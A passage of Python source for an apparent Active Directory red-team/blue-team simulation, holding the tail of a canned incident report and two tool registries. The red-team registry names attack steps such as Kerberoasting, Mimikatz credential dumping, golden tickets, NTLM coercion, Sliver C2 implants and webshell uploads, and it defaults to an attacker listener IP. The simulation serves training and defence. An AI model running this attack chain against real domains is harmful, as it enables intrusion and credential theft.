  - Administrator, jsmith (Domain Admins)
  - svc_web, svc_sql (service accounts - password reset AND ACL review)
  - bwilson, agarcia (user accounts)
  - backup_admin
  - DC01$, WEB01$, WS01$, WS02$ (computer accounts - reset passwords)

Fake/malicious accounts to remove:
  - CYBERORION-FAKE$ (DELETED - remediation done)

4. INDICATORS OF COMPROMISE (IOCs)
-----------------------
Network IOCs:
  - Attacker IP: 10.10.10.99
  - C2 domain: c2.attacker-domain.xyz
  - C2 traffic: HTTPS beacons to 10.10.10.99:443 every 5 seconds

Host-based IOCs:
  - File: C:\\Windows\\Temp\\sliver_implant.exe
    SHA256: a1b2c3d4e5f678901234567890abcdef1234567890abcdef1234567890abcdef
  - File: C:\\inetpub\\wwwroot\\shell.aspx (ASPX webshell)
  - Process: mimikatz.exe, rubeus.exe, certipy.exe (memory-resident)
  - Service: SliverSvc (C2 service persistence)
  - WMI subscription: SystemMonitor event consumer
  - Scheduled Task: "Windows Health Check" (PowerShell download cradle)

AD Persistence IOCs:
  - Golden TGT with 10-year validity (REVOKED - krbtgt rotated)
  - msDS-KeyCredentialLink on DC01$ (Shadow Credentials) - TO REMOVE
  - CYBERORION-FAKE$ fake computer account - DELETED
  - msDS-AllowedToActOnBehalfOfOtherIdentity on WEB01$ - CLEARED

5. REMEDIATION ACTIONS TAKEN
-----------------------
[COMPLETE]
[x] Emergency incident declared and Blue Team assembled
[x] All compromised hosts isolated via Windows Firewall
[x] C2 traffic blocked at firewall (10.10.10.99/0 block)
[x] KRBTGT double password rotation - golden tickets invalidated!
[x] RBCD backdoor cleared from WEB01$
[x] Fake computer CYBERORION-FAKE$ deleted
[x] Sliver C2 service stopped and disabled
[x] WMI backdoor subscriptions removed
[x] Webshell shell.aspx deleted from IIS
[x] Malicious scheduled task removed
[x] Event logs collected and preserved for forensics
[x] Memory dumps captured from all hosts for analysis

[IN PROGRESS]
[ ] Full password reset for all domain users and computers
[ ] Shadow Credentials removal from DC01$
[ ] Full forensic analysis of disk images and memory dumps
[ ] Search for additional persistence mechanisms
[ ] Review and remediate AD ACLs (BloodHound audit)

6. REMEDIATION RECOMMENDATIONS
-----------------------
URGENT (24 hours):
  1. Reset ALL user and computer account passwords
  2. Remove Shadow Credentials from DC01$
  3. Rebuild WEB01, WS01, WS02 from clean images (don't trust clean!)
  4. Consider DC01 rebuild as well after compromise

SHORT-TERM (1 week):
  1. Disable anonymous SMB and LDAP access
  2. Implement Tiered Administrative model
  3. Set ms-DS-MachineAccountQuota to 0
  4. Enable LSA Protection (RunAsPPL) on all systems
  5. Enable Credential Guard on Win10+ workstations
  6. Remove dangerous AD ACLs discovered via BloodHound
  7. Audit all service accounts:
     - Ensure DONT_REQ_PREAUTH is NOT set
     - Use long (>30 char) random passwords
     - Use Group Managed Service Accounts (gMSA) where possible

MEDIUM-TERM (1 month):
  1. Deploy Microsoft Defender for Identity (MDI)
  2. Enable advanced audit logging on all DCs
  3. Implement JIT/JEA for privileged access
  4. Deploy EDR solution with behavioral detection
  5. Implement network segmentation (limit lateral movement)
  6. Regular penetration testing and BloodHound audits
  7. Security awareness training for IT staff

7. LESSONS LEARNED
-----------------------
- This attack was preventable at MULTIPLE stages:
  - No anonymous access = no initial recon or credentials.txt
  - No AS-REP/Kerberoast = no initial credential access
  - Clean ACLs = no privilege escalation path
  - MachineAccountQuota=0 = no RBCD fake computer
  - No DA logon to app servers = no DA credential dump
  - Credential Guard/RunAsPPL = no LSASS dump
- Detection was too slow (~45 minutes from start to alert)
- Need better behavioral analytics in SIEM
- Golden ticket detection alerted very late (should detect 4769 anomalies)

================================================================================
                         END OF INCIDENT REPORT
              Report generated by Blue Team IR automation
================================================================================
"""


def build_red_sim_tools() -> list[dict[str, Any]]:
    return [
        _make_tool("nmap_scan", "Run Nmap port scan to discover hosts and services", {"target": {"type": "string", "description": "Target network/host", "default": "10.10.10.0/24"}}, _nmap_scan),
        _make_tool("smb_enum", "Enumerate SMB shares and test anonymous access", {"target": {"type": "string", "description": "Target IP/hostname", "default": "10.10.10.10"}}, _smb_enum),
        _make_tool("ldap_query", "Query LDAP for user enumeration and domain info", {"target": {"type": "string", "description": "Target DC IP", "default": "10.10.10.10"}}, _ldap_query),
        _make_tool("bloodhound_collect", "Run BloodHound/SharpHound to find AD ACL attack paths", {"domain": {"type": "string", "description": "Domain name", "default": "cyberorion.local"}}, _bloodhound_collect),
        _make_tool("asrep_roast", "Perform AS-REP roasting against users with DONT_REQ_PREAUTH", {"target": {"type": "string", "description": "Target DC", "default": "10.10.10.10"}, "userlist": {"type": "string", "description": "User list file"}}, _asrep_roast),
        _make_tool("kerberoast", "Perform Kerberoasting to request TGS tickets for SPN accounts", {"target": {"type": "string", "description": "Target DC", "default": "10.10.10.10"}}, _kerberoast),
        _make_tool("hashcat_crack", "Crack Kerberos/NTLM hashes using Hashcat with wordlist", {"hashfile": {"type": "string", "description": "Hash file path"}, "wordlist": {"type": "string", "description": "Wordlist path", "default": "/usr/share/wordlists/rockyou.txt"}}, _hashcat_crack),
        _make_tool("smb_download", "Download files from SMB shares", {"remote_path": {"type": "string", "description": "Remote file path on share"}, "local_path": {"type": "string", "description": "Local save path", "default": "."}, "target": {"type": "string", "description": "Target host", "default": "10.10.10.20"}}, _smb_download),
        _make_tool("crackmapexec_smb", "Test credentials and admin access via CrackMapExec SMB", {"target": {"type": "string", "description": "Target host/network"}, "username": {"type": "string", "description": "Username to test"}, "password": {"type": "string", "description": "Password/hash"}}, _crackmapexec_smb),
        _make_tool("netrpc_changepw", "Reset user password via SMB/RPC using ACL rights (GenericAll/ForceChangePassword)", {"target": {"type": "string", "description": "Target DC"}, "username": {"type": "string", "description": "User whose password to change"}, "newpassword": {"type": "string", "description": "New password", "default": "CyberOrion123!"}}, _netrpc_changepw),
        _make_tool("rbcd_attack", "Perform Resource-Based Constrained Delegation attack to take over computer accounts", {"target": {"type": "string", "description": "Target computer hostname/IP"}, "fqdn_computer": {"type": "string", "description": "Fake computer name to create", "default": "CYBERORION-FAKE$"}}, _rbcd_attack),
        _make_tool("wmiexec", "Execute commands via WMI DCOM for lateral movement", {"target": {"type": "string", "description": "Target host"}, "command": {"type": "string", "description": "Command to execute"}, "username": {"type": "string", "description": "Username"}, "password": {"type": "string", "description": "Password"}}, _wmiexec),
        _make_tool("winrm_exec", "Execute commands via WinRM/PowerShell Remoting", {"target": {"type": "string", "description": "Target host"}, "command": {"type": "string", "description": "Command/script to execute"}, "username": {"type": "string", "description": "Username", "default": "svc_web"}, "password": {"type": "string", "description": "Password", "default": "CyberOrion123!"}}, _winrm_exec),
        _make_tool("mimikatz_dump", "Run Mimikatz to dump credentials from LSASS memory", {"target": {"type": "string", "description": "Target host", "default": "WEB01"}}, _mimikatz_dump),
        _make_tool("pass_the_hash", "Pass-the-Hash lateral movement and DCSync", {"target": {"type": "string", "description": "Target host", "default": "10.10.10.10"}, "username": {"type": "string", "description": "Username", "default": "jsmith"}, "hash": {"type": "string", "description": "NTLM hash", "default": "8846f7eaee8fb117ad06bdd830b7586c"}}, _pass_the_hash),
        _make_tool("golden_ticket", "Forge Kerberos golden TGT using krbtgt hash for persistence", {"domain": {"type": "string", "description": "Domain FQDN", "default": "cyberorion.local"}, "dc_ip": {"type": "string", "description": "DC IP", "default": "10.10.10.10"}}, _golden_ticket),
        _make_tool("shadow_creds", "Perform Shadow Credentials attack by writing to msDS-KeyCredentialLink", {"target": {"type": "string", "description": "Target computer account", "default": "DC01$"}}, _shadow_creds),
        _make_tool("petitpotam", "PetitPotam NTLM coercion attack to force DC authentication to attacker", {"listener": {"type": "string", "description": "Attacker listener IP", "default": "10.10.10.99"}, "target": {"type": "string", "description": "Target DC to coerce", "default": "10.10.10.10"}}, _petitpotam),
        _make_tool("dfs_coerce", "DFSCoerce NTLM coercion attack using MS-DFSNM protocol", {"listener": {"type": "string", "description": "Attacker listener IP", "default": "10.10.10.99"}, "target": {"type": "string", "description": "Target DC to coerce", "default": "10.10.10.10"}}, _dfs_coerce),
        _make_tool("sliver_generate", "Generate Sliver C2 HTTPS implant binary", {"lhost": {"type": "string", "description": "C2 listener IP", "default": "10.10.10.99"}, "lport": {"type": "string", "description": "C2 listener port", "default": "443"}, "format": {"type": "string", "description": "Output format", "default": "exe"}}, _sliver_generate),
        _make_tool("sliver_execute", "Upload and execute Sliver C2 implant on target", {"target": {"type": "string", "description": "Target host", "default": "WEB01"}, "implant_path": {"type": "string", "description": "Remote path to drop implant", "default": "C:\\\\Temp\\\\sliver_implant.exe"}}, _sliver_execute),
        _make_tool("web_shell_upload", "Upload ASPX/PHP webshell to web server for code execution", {"target": {"type": "string", "description": "Target web server", "default": "10.10.10.20"}, "shell_name": {"type": "string", "description": "Shell filename", "default": "shell.aspx"}}, _web_shell_upload),
        _make_tool("bloodhound_owned", "Mark domain as owned in BloodHound and display attack recap", {"domain": {"type": "string", "description": "Domain name", "default": "cyberorion.local"}}, _bloodhound_owned),
    ]


def build_blue_sim_tools() -> list[dict[str, Any]]:
    return [
        _make_tool("check_event_logs", "Analyze Windows Security Event logs for suspicious activity (failed logons, privilege use, object changes)", {"host": {"type": "string", "description": "Host to check logs on", "default": "all"}}, _check_event_logs),
        _make_tool("host_isolation", "Isolate compromised host via firewall rules, block all traffic except Blue Team management", {"host": {"type": "string", "description": "Host to isolate"}}, _host_isolation),
        _make_tool("check_processes", "Enumerate running processes and detect suspicious/malicious binaries (C2, mimikatz, webshell spawns)", {"host": {"type": "string", "description": "Host to check", "default": "WEB01"}}, _check_processes),
        _make_tool("check_network", "Analyze network connections for C2 beacons, lateral movement, and suspicious traffic", {"host": {"type": "string", "description": "Host to check", "default": "WEB01"}}, _check_network),
        _make_tool("check_persistence", "Hunt for persistence mechanisms (services, WMI, golden tickets, Shadow Credentials, RBCD, scheduled tasks)", {"host": {"type": "string", "description": "Host/domain to check", "default": "DC01"}}, _check_persistence),
        _make_tool("password_reset", "Force reset compromised account passwords in Active Directory", {"username": {"type": "string", "description": "Account to reset"}, "new_password": {"type": "string", "description": "New password (auto-generated if not provided)"}}, _password_reset),
        _make_tool("disable_account", "Disable compromised/malicious AD accounts and remove from privileged groups", {"username": {"type": "string", "description": "Account to disable"}}, _disable_account),
        _make_tool("force_logoff", "Force user logoff from all sessions and invalidate all Kerberos tickets", {"username": {"type": "string", "description": "User to log off"}, "host": {"type": "string", "description": "Host(s) to log off from", "default": "all"}}, _force_logoff),
        _make_tool("hunt_lateral", "Trace and build lateral movement timeline from logs and network data", {}, _hunt_lateral),
        _make_tool("check_ioc", "Scan for Indicators of Compromise (IOCs) - files, hashes, network, registry", {}, _check_ioc),
        _make_tool("revoke_rbcd", "Remove RBCD backdoor and delete fake computer accounts used in delegation attack", {"target_computer": {"type": "string", "description": "Target computer object", "default": "WEB01$"}, "fake_computer": {"type": "string", "description": "Fake computer to delete", "default": "CYBERORION-FAKE$"}}, _revoke_rbcd),
        _make_tool("krbtgt_rotate", "Perform double krbtgt password rotation to invalidate golden tickets (only golden ticket remediation)", {}, _krbtgt_rotate),
        _make_tool("escalation_triage", "Analyze privilege escalation paths used by attacker and identify misconfigurations", {}, _escalation_triage),
        _make_tool("generate_report", "Generate comprehensive incident report with timeline, IOCs, compromised accounts, and remediation steps", {}, _generate_report),
    ]


reset_sim()
